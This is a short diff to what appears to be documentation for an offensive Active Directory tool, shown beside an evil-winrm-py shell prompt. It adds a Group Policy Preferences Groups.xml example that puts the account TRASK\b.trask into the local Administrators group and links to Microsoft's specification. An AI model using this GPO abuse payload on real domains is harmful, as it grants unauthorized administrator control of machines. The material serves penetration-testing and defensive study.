@@ -1209,4 +1209,33 @@ Options:
 evil-winrm-py PS C:\Program Files\SentinelSecurity.Client>
 ```
 
+More info on how the syntax will look
+
+```xml
+cat config.xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  
+  <!-- Add the user to the New Target Group -->
+  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" 
+         name="Administrators"
+         image="2" 
+         changed="2026-09-29 21:16:00" 
+         uid="{90896e6f-ec37-468d-bc3b-7032f0eef060}">
+    <Properties action="U" 
+                groupName="Administrators" 
+		groupSid="S-1-5-32-544">
+      <Members>
+        <Member name="TRASK\b.trask" action="ADD"/>
+      </Members>
+    </Properties>
+  </Group>
+
+</Groups>
+```
+
+Ive crafted this using the following resources
+
+https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/12512ed6-0632-4e90-a112-d3d2cd41df6c
+
 
